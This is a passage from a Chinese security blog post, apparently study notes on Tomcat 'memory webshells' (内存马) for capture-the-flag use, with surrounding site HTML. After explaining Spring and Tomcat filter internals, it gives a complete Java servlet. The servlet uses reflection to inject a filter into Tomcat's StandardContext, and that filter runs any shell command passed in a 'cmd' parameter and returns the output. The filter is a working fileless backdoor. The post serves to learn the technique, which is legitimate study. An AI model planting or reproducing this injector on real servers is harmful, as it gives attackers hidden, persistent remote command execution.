+<p>Servlet过滤器，允许为请求指定字符编码。这很有用，因为当前的浏览器通常不设置字符编码，即使在HTML页面或表单中指定了。</p>
+<p>如果请求还没有指定编码，这个过滤器可以应用它的编码，或者在任何情况下强制这个过滤器的编码(“forceEncoding”&#x3D;”true”)。在后一种情况下，编码也将作为默认响应编码应用(尽管这通常会被视图中的完整内容类型集覆盖)。</p>
+</blockquote>
+<p>FormContentFilter</p>
+<blockquote>
+<p>用于解析HTTP PUT、PATCH和DELETE请求的表单数据并将其公开为Servlet请求参数的过滤器。默认情况下，Servlet规范只要求对HTTP POST进行此操作。</p>
+</blockquote>
+<p>RequestContextFilter</p>
+<blockquote>
+<p>Servlet过滤器，通过LocaleContextHolder和RequestContextHolder向当前线程公开请求。在web.xml中注册为过滤器。</p>
+<p>或者，Spring的org.springframework.web.context.request.RequestContextListener和Spring的org.springframework.web.servlet.DispatcherServlet也向当前线程公开相同的请求上下文。<br>这个过滤器主要用于第三方servlet，例如JSF的FacesServlet。在Spring自己的web支持中，DispatcherServlet的处理是完全足够的。</p>
+</blockquote>
+<h3 id="开始exp"><a href="#开始exp" class="headerlink" title="开始exp"></a>开始exp</h3><p> 我写内存马是想把恶意代码加载到内存中，上面的本地测试我是创建的filter,并且配置了filter，而比赛中我们是不可能这样加载的，所以我应该动态创建一个filter并加载到filterchain中 </p>
+<p>所以我们要获取运行服务器的Standardcontext<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9914?time__1311=n4+xuDgD9Am4yDfxxBqDqplYFD=UPDCiSQeD">(这个讲的很详细)</a>,我们还要写三个<code>filterDefs</code>,<code>filterConfigs</code>和<code>filterMaps</code>来配置filter</p>
+<blockquote>
+<ol>
+<li>先获取<code>filterDef</code>对象,进行一系列配置,利用<code>standardcontext</code>的addfilter进行加载</li>
+<li>获取<code>filterMaps</code> 对象,配置路径等信息,利用<code>standardcontext</code>的addFilterMapBefore进行加载,修改 HashMap中的顺序</li>
+<li><code>filterConfigs</code>是调用 <code>StandardContext</code> 的 filterStart方法创建ApplicationFilterConfig实例放到<code>filterConfigs</code>中</li>
+</ol>
+</blockquote>
+<p>ApplicationContextFacade类重写了<font color='cornflowerblue'>addfilter</font>，这个类实现了对 ApplicationContext对象的封装（封装就是你点一下context.addfilter,他就会跳转到ApplicationContext）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> FilterRegistration.Dynamic <span class="title function_">addFilter</span><span class="params">(String filterName,</span></span><br><span class="line"><span class="params">          String filterClass, Filter filter)</span> <span class="keyword">throws</span> IllegalStateException &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (filterName == <span class="literal">null</span> || filterName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(sm.getString(</span><br><span class="line">                  <span class="string">&quot;applicationContext.invalidFilterName&quot;</span>, filterName));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;</span><br><span class="line">          <span class="comment">//TODO Spec breaking enhancement to ignore this restriction</span></span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">                  sm.getString(<span class="string">&quot;applicationContext.addFilter.ise&quot;</span>,</span><br><span class="line">                          getContextPath()));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> context.findFilterDef(filterName);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Assume a &#x27;complete&#x27; FilterRegistration is one that has a class and</span></span><br><span class="line">      <span class="comment">// a name</span></span><br><span class="line">      <span class="keyword">if</span> (filterDef == <span class="literal">null</span>) &#123;</span><br><span class="line">          filterDef = <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">          filterDef.setFilterName(filterName);</span><br><span class="line">          context.addFilterDef(filterDef);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (filterDef.getFilterName() != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                  filterDef.getFilterClass() != <span class="literal">null</span>) &#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (filter == <span class="literal">null</span>) &#123;</span><br><span class="line">          filterDef.setFilterClass(filterClass);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">          filterDef.setFilter(filter);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ApplicationFilterRegistration</span>(filterDef, context);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>大概意思是:</p>
+<p>找不到filterdef就自己创建一个,根据名字获得filterclass然后 context.addFilterDef(filterDef)，最后返回ApplicationFilterRegistration对象</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demos.web.mytext;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilfilter</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext)context.get(servletContext);</span><br><span class="line">            <span class="comment">//从servletContext获取context属性的值</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardcontext</span> <span class="operator">=</span> (StandardContext)context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">filterConfig</span> <span class="operator">=</span> standardcontext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            filterConfig.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map)filterConfig.get(standardcontext);</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">                <span class="type">HttpServletResponse</span> <span class="variable">resp</span> <span class="operator">=</span> (HttpServletResponse) response;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    resp.getWriter().write(output);</span><br><span class="line">                    resp.getWriter().flush();</span><br><span class="line">                &#125;</span><br><span class="line">                chain.doFilter(request, response);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//FilterDef</span></span><br><span class="line">            String filtername=<span class="string">&quot;helloeveryday&quot;</span>;</span><br><span class="line">            Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = aClass.getConstructor();</span><br><span class="line">            FilterDef  filterdef= (FilterDef)constructor.newInstance();</span><br><span class="line">            filterdef.setFilter(filter);</span><br><span class="line">            filterdef.setFilterName(filtername);</span><br><span class="line">            filterdef.setFilterClass(filter.getClass().getName());</span><br><span class="line">            standardcontext.addFilterDef(filterdef);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//FilterMap</span></span><br><span class="line">            Class&lt;?&gt; aClass2 = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; declaredConstructor1 = aClass2.getDeclaredConstructor();</span><br><span class="line">            <span class="type">FilterMap</span> <span class="variable">o1</span> <span class="operator">=</span> (FilterMap)declaredConstructor1.newInstance();</span><br><span class="line">            o1.addURLPattern(<span class="string">&quot;/hello&quot;</span>);</span><br><span class="line">            o1.setFilterName(filtername);</span><br><span class="line">            o1.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">            standardcontext.addFilterMapBefore(o1);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            Class&lt;?&gt; aClass1 = Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; declaredConstructor = aClass1.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)declaredConstructor.newInstance(standardcontext,filterdef);</span><br><span class="line">            filterConfigs.put(filtername,applicationFilterConfig);</span><br><span class="line">            resp.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        doGet(req, resp);</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/hanggerui88/pic/pic/pic/202404240019582.jpg"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/filter%E5%AD%97%E8%8A%82%E7%A0%81/" rel="tag">filter字节码</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/banner.webp" data-sizes="auto" alt="内存马学习笔记（二）" class="lazyload">
+          
+        
+        <a href="/2024/03/17/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"></a>
+        <div class="article-nav-caption">Newer</div>
+        <h3 class="article-nav-title">
+          
+            内存马学习笔记（二）
+          
+        </h3>
+      </div>
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="2024 vnctf givenphp" class="lazyload">
+        
+      
+      <a href="/2024/03/08/2024-vnctf-givenphp/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          2024 vnctf givenphp
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2025
+      
+      <span class="footer-info-sep rotate"></span>
+      John Doe
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        23.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        01:47
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">内存码学习笔记（一）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#filter%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.</span> <span class="toc-text">filter内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%BC%80%E5%A7%8B%E8%B0%83%E9%A1%B9%E7%9B%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">最开始调项目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.1.2.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90filter%E5%89%8D%E5%A5%8F"><span class="toc-number">1.1.3.</span> <span class="toc-text">分析filter前奏</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tomcat"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">tomcat</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Connector"><span class="toc-number">1.1.3.1.1.</span> <span class="toc-text">Connector</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Context%EF%BC%9A"><span class="toc-number">1.1.3.1.2.</span> <span class="toc-text">Context：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90filter%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.4.</span> <span class="toc-text">分析filter流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E4%BB%A3%E7%A0%81%E9%81%87%E5%88%B0%E7%9A%84%E6%9C%89%E5%85%B3filter%E7%9A%84%E7%B1%BB"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">调代码遇到的有关filter的类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%A7%8Bexp"><span class="toc-number">1.1.5.</span> <span class="toc-text">开始exp</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="John Doe" class="lazyload">
+  <div class="sidebar-author-name">John Doe</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">22</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "John Doe",
+          title: "内存马学习笔记",
+          url: "http://example.com/2024/03/16/%E5%86%85%E5%AD%98%E7%A0%81%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/",
+          excerpt: "",
+          description: "",
+          stripContent: "内存码学习笔记（一）什么是内存马？他不是像文件存储再硬盘中，而是存储到内存中，不能永久储存，但更隐蔽 filter内存马最开始调项目看了很多教程，最后还是用springboot起的项目，  controller随便写，filter中 123456789101112131415161718192021222324252627282930313233343536import org.springframework.core.annotation.Order;import org.springfram",
+          date: "Sat Mar 16 2024 00:26:27 GMT+0800",
+          updated: "Wed Apr 24 2024 00:38:52 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
